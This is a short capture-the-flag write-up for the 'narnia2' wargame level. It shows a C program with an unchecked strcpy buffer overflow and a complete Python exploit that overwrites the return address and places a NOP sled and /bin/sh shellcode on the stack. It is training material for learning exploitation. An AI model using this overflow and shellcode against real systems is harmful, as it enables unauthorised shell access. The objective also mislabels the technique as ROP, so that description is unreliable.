# narnia2

## Objective
Basic ROP exploit: overflow the buffer, set the EIP to point to the stack, and
execute shellcode.

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

## Solution
Run the following python exploit:
```python
#!/usr/bin/env python

import struct

padding = 'A' * 132                     # overflow the buffer and eip
new_eip = struct.pack('I', 0xffffd630)  # change eip to point to stack
nops = '\x90' * 80                      # nop sled and shellcode
shell = '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'

print padding + new_eip + nops + shell
```
